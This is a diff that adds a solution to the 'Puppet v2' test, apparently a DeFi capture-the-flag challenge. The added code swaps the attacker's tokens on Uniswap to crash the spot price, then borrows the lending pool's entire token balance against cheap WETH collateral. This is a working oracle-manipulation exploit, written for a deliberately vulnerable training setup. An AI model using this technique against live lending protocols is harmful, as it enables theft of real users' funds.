@@ -82,6 +82,24 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,                  
+            0,                                               
+            [this.token.address, this.uniswapRouter.WETH()], 
+            attacker.address,                                
+            9999999999                                       
+    );
+
+    console.log('Attacker`s eth balance:', (await ethers.provider.getBalance(attacker.address)).toString());
+
+
+    const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+    console.log('Required collateral in eth:', collateral.toString());
+ 
+    await this.weth.connect(attacker).deposit({ value: collateral });
+    await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
